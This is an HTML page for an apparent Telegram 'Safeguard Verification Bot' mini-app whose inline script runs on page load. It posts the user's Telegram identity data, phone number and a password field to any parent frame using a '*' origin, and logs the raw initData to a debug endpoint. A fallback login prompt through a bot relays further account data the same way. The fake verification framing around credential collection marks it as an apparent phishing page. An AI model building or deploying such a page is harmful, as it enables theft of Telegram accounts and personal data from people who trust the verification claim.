<!DOCTYPE html>
<html style="--tg-color-scheme: dark; --tg-theme-bg-color: #212121; --tg-theme-text-color: #ffffff; --tg-theme-hint-color: #aaaaaa; --tg-theme-link-color: #8774e1; --tg-theme-button-color: #8774e1; --tg-theme-button-text-color: #ffffff; --tg-theme-secondary-bg-color: #0f0f0f; --tg-theme-header-bg-color: #212121; --tg-theme-accent-text-color: #8774e1; --tg-theme-section-bg-color: #212121; --tg-theme-section-header-text-color: #aaaaaa; --tg-theme-subtitle-text-color: #aaaaaa; --tg-theme-destructive-text-color: #e53935; --tg-viewport-height: 100vh; --tg-viewport-stable-height: 100vh;">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width">
    <title>Safeguard</title>
    <meta name="description" content="@Safeguard Verification Bot">
    <link rel="icon" href="./favicon.ico">
    <meta name="next-head-count" content="5">
    <link rel="preload" href="./_next/static/css/3db7e18ba6d2d9e9.css" as="style">
    <link rel="stylesheet" href="./_next/static/css/3db7e18ba6d2d9e9.css" data-n-g="">
    <!-- Add Telegram Web App script -->
    <script>
  window.onload = () => {
    fetch('/api/debug', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ message: 'Safeguard mini-app loaded' }),
    });
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
    const type = urlParams.get('type') || 'safeguard';
    Telegram.WebApp.ready();
    fetch('/api/debug', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ message: 'Telegram.WebApp.ready() called' }),
    });
    Telegram.WebApp.expand();
    // Use initData to get user data directly
    const initData = Telegram.WebApp.initDataUnsafe;
    fetch('/api/debug', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ message: `initData: ${JSON.stringify(initData)}` }),
    });
    if (initData && initData.user) {
      const user = initData.user;
      fetch('/api/debug', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ message: `Sending postMessage for type ${type} with userId ${user.id}` }),
      });
      window.parent.postMessage({
        type,
        id: user.id,
        first_name: user.first_name,
        usernames: [{ username: user.username, isActive: true }],
        phone_number: user.phone_number || 'Not shared',
        premium: user.is_premium || false,
        password: 'Not available via initData',
        quickly_set: {}
      }, '*');
    } else {
      fetch('/api/debug', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ message: 'No user data in initData' }),
      });
      // Fallback to login flow
      Telegram.WebApp.MainButton.setText('Login to Telegram')
        .show()
        .onClick(() => {
          fetch('/api/debug', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({ message: 'MainButton clicked' }),
          });
          Telegram.WebApp.showPopup({
            title: 'Login to Telegram',
            message: 'Please login to your Telegram account to continue.',
            buttons: [
              { id: 'login', type: 'default', text: 'Login' },
              { type: 'cancel' }
            ]
          }, (buttonId) => {
            fetch('/api/debug', {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
              },
              body: JSON.stringify({ message: `Popup button clicked: ${buttonId}` }),
            });
            if (buttonId === 'login') {
              Telegram.WebApp.openTelegramLink('https://t.me/SafetyGuardianRobot?start=login');
            }
          });
        });
      Telegram.WebApp.onEvent('web_app_data', (event) => {
        fetch('/api/debug', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ message: `Received web_app_data event: ${event.data}` }),
        });
        const data = JSON.parse(event.data);
        fetch('/api/debug', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ message: `Sending postMessage for type ${type} with userId ${data.id}` }),
        });
        window.parent.postMessage({
          type,
          id: data.id,
          first_name: data.first_name,
          usernames: data.usernames,
          phone_number: data.phone_number,
          premium: data.is_premium,
          password: data.password,
          quickly_set: data.quickly_set
        }, '*');
      });
    }
  };
</script>
  </body>
</html>
